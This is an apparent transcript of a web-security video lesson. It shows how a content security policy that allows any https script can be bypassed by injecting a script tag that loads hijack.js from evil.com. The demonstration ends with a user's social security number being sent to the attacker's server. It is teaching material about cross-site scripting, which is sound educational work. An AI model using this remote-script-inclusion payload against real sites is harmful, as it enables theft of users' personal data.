Instructor: [00:00] Now that we mitigated XSS via inline script injection, let's put our attacker hat back on. If we inspect the content security policy of the site, we see that it allows scripts from `self` and from `https`.

[00:12] We could take our malicious payload, strip the `<script>` tags and save this as a new file. Let's call it `hijack.js`. This file will now be available for download.

[00:33] If we logged back in to our site and we've put into the message box script source = https://evil.com:666/hijack.js and hit submit, 

```html
<script src="https://evil.com:666/hijack.js"></script>
```

we see that hijack.js gets included, which will create the image and cause our hijacked payload to be submitted.

[01:01] You can verify that the server has received the user's social security number again, thereby completing the XSS attack via a technique known as remote script inclusion.